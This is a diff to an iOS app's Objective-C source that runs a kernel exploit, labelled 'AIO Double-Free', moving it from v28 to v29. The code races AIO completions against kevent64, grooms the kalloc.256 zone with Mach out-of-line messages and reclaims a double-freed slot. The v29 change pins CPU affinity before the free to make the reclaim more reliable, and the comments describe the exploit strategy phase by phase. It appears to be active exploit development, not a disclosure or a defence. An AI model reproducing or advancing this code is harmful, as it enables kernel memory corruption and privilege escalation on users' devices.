@@ -356,7 +356,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *aioConf = [UIButtonConfiguration filledButtonConfiguration];
     aioConf.baseBackgroundColor = [UIColor systemOrangeColor];
     self.aioUafButton.configuration = aioConf;
-    [self.aioUafButton setTitle:@"AIO Double-Free v28" forState:UIControlStateNormal];
+    [self.aioUafButton setTitle:@"AIO Double-Free v29" forState:UIControlStateNormal];
     [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aioUafButton];
 
@@ -5742,7 +5742,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO Double-Free v28 =========="];
+    [self appendLog:@"\n========== AIO Double-Free v29 =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5761,7 +5761,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self appendLog:@"FAIL: could not create temp file"];
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
-            [self.aioUafButton setTitle:@"AIO Double-Free v28" forState:UIControlStateNormal];
+            [self.aioUafButton setTitle:@"AIO Double-Free v29" forState:UIControlStateNormal];
         });
         return;
     }
@@ -5780,7 +5780,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     // v25/v26 proved the no-kevent approach eliminates crashes, but without a
     // kernel address leak we can't craft valid OOL payloads for Phase D overlap.
     //
-    // v28: SIGEV_KEVENT on tcb, kevent64(timeout=0) IMMEDIATELY after racer,
+    // v29: SIGEV_KEVENT on tcb, kevent64(timeout=0) IMMEDIATELY after racer,
     // BEFORE rcbs[0] completes. rcbs[0] occupies the reclaimed slot → live entry
     // with valid procp → filt_aioprocess safe. v18 proved kevent64 returns
     // cached ext[0]/ext[1] for completed AIO events, and filt_aioprocess skips
@@ -5920,13 +5920,16 @@ static void *e2_free_and_ool_racer(void *arg) {
     // rcbs[0] occupies slot S (entryAddr). After Phase A kevent64,
     // filt_aioprocess cached path skipped TAILQ_REMOVE, so rcbs[0]
     // is still on doneq. Read fields before freeing.
+    // v29: Set CPU affinity BEFORE aio_return so the freed slot S
+    // goes to CPU 42's per-CPU magazine (same CPU as racer).
+    // This enables Phase C's LIFO reclaim from the same magazine.
     [self appendLog:@"\n--- Phase B: Entry field probe ---"];
     {
         int rcb0_err = aio_error(&rcbs[0]);
         [self appendLog:[NSString stringWithFormat:@"  aio_error(rcbs[0])=%d (pre-free)", rcb0_err]];
-        // rcbs[0] is still alive on doneq. aio_return will free slot S.
+        aio_set_thread_affinity(42);  // v29: set BEFORE free for same-CPU magazine
         ssize_t rcb0_ret = aio_return(&rcbs[0]);
-        [self appendLog:[NSString stringWithFormat:@"  aio_return(rcbs[0])=%zd (freed slot S)", rcb0_ret]];
+        [self appendLog:[NSString stringWithFormat:@"  aio_return(rcbs[0])=%zd (freed slot S → CPU 42 mag)", rcb0_ret]];
     }
 
     // ---- Phase C: Sequential LIFO reclaim ----
@@ -6015,7 +6018,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     // the overlapped slot (byte-offset payload).
     // NO kevent, NO aio_return on overlapped entry → no crash.
 
-    [self appendLog:@"\n--- Phase D v28: v20-style drain + overlap ---"];
+    [self appendLog:@"\n--- Phase D v29: v20-style drain + overlap ---"];
 
     // OOL payload: byte-offset pattern for field mapping
     enum { kDrainOolSize = 256 };
@@ -6030,7 +6033,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         mach_msg_ool_descriptor_t ool;
     } DrainMsg;
 
-    // ---- Phase D v28: v20-style drain + E2 + single OOL overlap ----
+    // ---- Phase D v29: v20-style drain + E2 + single OOL overlap ----
     // Strategy: Pre-E2 drain of kalloc.256 (9 OOL msgs via 3 ports × 3 sends)
     // changes freelist state so the double-freed slot moves closer to the
     // magazine head. Then E2 claims one copy, single OOL hits the other.
@@ -6168,11 +6171,11 @@ static void *e2_free_and_ool_racer(void *arg) {
     close(fd);
     unlink(path.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
-    [self appendLog:@"========== AIO Double-Free v28 Complete =========="];
+    [self appendLog:@"========== AIO Double-Free v29 Complete =========="];
             _aioRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
-                [self.aioUafButton setTitle:@"AIO Double-Free v28" forState:UIControlStateNormal];
+                [self.aioUafButton setTitle:@"AIO Double-Free v29" forState:UIControlStateNormal];
             });
         }  // @autoreleasepool
     });  // dispatch_async
